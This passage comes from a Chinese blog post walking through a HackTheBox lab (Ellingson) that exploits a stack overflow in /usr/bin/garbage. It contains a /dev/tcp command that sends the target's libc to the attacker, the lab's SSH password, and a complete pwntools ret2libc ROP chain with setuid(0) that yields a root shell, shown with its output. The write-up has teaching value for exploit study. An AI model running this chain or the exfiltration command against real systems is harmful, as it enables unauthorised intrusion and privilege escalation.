language-bash\"\u003emargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 =\u003e /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将\u003ccode\u003e/lib/x86_64-linux-gnu/libc.so.6\u003c/code\u003e下载到靶机中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// kali\n➜  Ellingson nc -lvp 1234 \u003e libc.so.6\n// Machine\nmargo@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /lib/x86_64-linux-gnu/libc.so.6 \u003e /dev/tcp/your-ip/1234\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e首先判断填充值，这里使用\u003ccode\u003egarbage\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson pwndbg garbage \npwndbg\u003e cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg\u003e run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u003cspan class=\"hljs-string\"\u003e\"/lib/x86_64-linux-gnu/libthread_db.so.1\"\u003c/span\u003e.\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e程序果不其然崩溃了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e计算偏移值，这里使用\u003ccode\u003emsf\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/PWN%20-%20%E5%9F%BA%E6%9C%ACROP/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到偏移值\u003ccode\u003e136\u003c/code\u003e （PS：这里使用\u003ccode\u003epwndbg\u003c/code\u003e的\u003ccode\u003ecyclic\u003c/code\u003e无法得到正确偏移值，但是\u003ccode\u003eWP\u003c/code\u003e中使用\u003ccode\u003egef\u003c/code\u003e等都可以很容易就得到偏移值）\u003c/p\u003e\n\u003cp\u003e得到偏移值后，我们选择一下获得哪个\u003ccode\u003eplt\u003c/code\u003e函数的真实地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epwndbg\u003e plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e@plt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ex64\u003c/code\u003e 传参需要使用寄存器，\u003ccode\u003e0x000000000040179b\u003c/code\u003e 符合\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson ROPgadget --binary garbage --only \u003cspan class=\"hljs-string\"\u003e\"pop|ret\"\u003c/span\u003e\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这里选择获得\u003ccode\u003eputs@plt\u003c/code\u003e ，我们通过\u003ccode\u003epwn\u003c/code\u003e连接\u003ccode\u003essh\u003c/code\u003e 来调试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_add = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_add:{hex(puts_real_add)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行后我们的得到了\u003ccode\u003eput\u003c/code\u003e的真实地址\u003ccode\u003e0x7f8eed3569c0\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_add:0x7f8eed3569c0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得其他地址，得到基地址后，我们要得到 \u003ccode\u003esystem\u003c/code\u003e 和 \u003ccode\u003e/bin/sh\u003c/code\u003e的地址\u003c/p\u003e\n\u003cp\u003e函数真实地址 = 基地址 + 函数偏移值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eGetShell\u003c/code\u003e ，得到需要的地址后，我们可以进行获取\u003ccode\u003eShell\u003c/code\u003e了\u003c/p\u003e\n\u003cp\u003e再此之前，我们还需要一个\u003ccode\u003eret\u003c/code\u003e来实现堆栈平衡\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson ROPgadget --binary garbage --only \u003cspan class=\"hljs-string\"\u003e\"ret\"\u003c/span\u003e    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\nret_addr = 0x0000000000401016\n\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后我们运行，但是权限只是 \u003ccode\u003emargo\u003c/code\u003e的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e$ $ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1002(margo) gid=1002(margo) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(margo)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eGetRootShell\u003c/code\u003e，我们还需要进行将\u003ccode\u003eshell\u003c/code\u003e权限提升，可以使用\u003ccode\u003esetuid\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003efrom pwn import *\nr = ssh(host=\u003cspan class=\"hljs-string\"\u003e'ellingson.htb'\u003c/span\u003e, user=\u003cspan class=\"hljs-string\"\u003e'margo'\u003c/span\u003e, password=\u003cspan class=\"hljs-string\"\u003e'iamgod$08'\u003c/span\u003e)\np = r.process(\u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e)\ne = ELF(\u003cspan class=\"hljs-string\"\u003e'./garbage'\u003c/span\u003e)\nlibc = ELF(\u003cspan class=\"hljs-string\"\u003e'./libc.so.6'\u003c/span\u003e)\n\nputs_plt_addr = e.plt[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nputs_got_addr = e.got[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\nstart_addr = e.symbols[\u003cspan class=\"hljs-string\"\u003e'_start'\u003c/span\u003e]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b\u003cspan class=\"hljs-string\"\u003e'Enter access password:'\u003c/span\u003e,payload1)\nputs_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"puts_real_addr:{hex(puts_real_addr)}\"\u003c/span\u003e)\n\nlibcbase = puts_real_addr - libc.sym[\u003cspan class=\"hljs-string\"\u003e'puts'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"libcbase:{hex(libcbase)}\"\u003c/span\u003e)\n\nsystem_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'system'\u003c/span\u003e]\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"system_addr:{hex(system_addr)}\"\u003c/span\u003e)\n\nbin_sh_addr = libcbase + next(libc.search(b\u003cspan class=\"hljs-string\"\u003e\"/bin/sh\"\u003c/span\u003e))\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(f\u003cspan class=\"hljs-string\"\u003e\"bin_sh_addr = {hex(bin_sh_addr)}\"\u003c/span\u003e)\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym[\u003cspan class=\"hljs-string\"\u003e'setuid'\u003c/span\u003e]\n\npayload2 = b\u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e运行获得 \u003ccode\u003eRootShell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'/usr/bin/garbage'\u003c/span\u003e!\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/garbage'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] \u003cspan class=\"hljs-string\"\u003e'/root/Desktop/HackTheBox/Ellingson/libc.so.6'\u003c/span\u003e\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(\u003cspan class=\"hljs-string\"\u003e'\\x7f'\u003c/span\u003e)[-6:].ljust(8, b\u003cspan class=\"hljs-string\"\u003e'\\x00'\u003c/span\u003e))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n\u003cspan class=\"hljs-comment\"\u003e# $ id\u003c/span\u003e\nuid=0(root) gid=1002(margo) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1002(margo)\n\u003c/code\u003e\u003c/pre\u003e","title":"PWN - 基本ROP","date":"2025-06-14","updated":"2025-06-15","tags":["PWN","ROP","ret2text","ret2shellcode","ret2syscall","ret2libc"],"categories":"二进制安全","comments":true,"description":"PWN - 基本ROP\n\n https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\n \n\n这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\n\n`HackTheBox ..."},"recentPosts":[{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"06","day":"15","id":"PWN - 基本ROP"},"buildId":"mjZBuiwGkP0bnzupdQUa7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>